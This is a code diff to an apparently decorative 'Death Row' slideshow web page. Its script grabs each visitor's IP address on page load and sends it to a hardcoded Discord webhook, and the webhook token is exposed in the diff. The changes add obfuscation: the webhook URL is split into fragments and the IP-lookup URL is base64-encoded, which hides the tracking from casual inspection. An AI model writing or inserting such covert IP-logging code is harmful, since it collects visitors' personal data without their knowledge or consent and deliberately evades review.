@@ -68,7 +68,7 @@
             padding: 20px;
             margin: 20px;
             text-align: left;
-            background-color: #111111; /* Dark background for the embed */
+            background-color: #000000; /* Dark background for the embed */
         }
         .embed img {
             display: block;
@@ -76,7 +76,7 @@
         }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
-    <link rel="icon" href="path_to_your_favicon.ico" type="image/x-icon"> <!-- Favicon link -->
+    <link rel="icon" href="305.jpg" type="image/x-icon"> <!-- Favicon link -->
 </head>
 <body>
     <div class="slideshow-container">
@@ -139,7 +139,12 @@
         <span>Death Row</span>
     </div>
     <script>
-        const webhookURL = "https://canary.discord.com/api/webhooks/1256247502366314576/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1"; // Replace with your Discord webhook URL
+        const part1 = "https://canary.discord.com/api/webhooks/";
+        const part2 = "1256247502366314576";
+        const part3 = "/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1";
+        const webhookURL = part1 + part2 + part3;
+
+        const ipFetchUrl = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
 
         let slideIndex = 0;
         showSlides();
@@ -156,7 +161,7 @@
         }
 
         function fetchIP() {
-            fetch('https://api.ipify.org?format=json')
+            fetch(ipFetchUrl)
                 .then(response => response.json())
                 .then(data => {
                     console.log('IP fetched:', data.ip);
@@ -172,7 +177,7 @@
 
         function sendToDiscord(ip) {
             const message = {
-                username: "ايبي",
+                username: "Death Row",
                 avatar_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&", // Optional: URL to the bot's avatar image
                 embeds: [{
                     title: "Visitor IP Information",
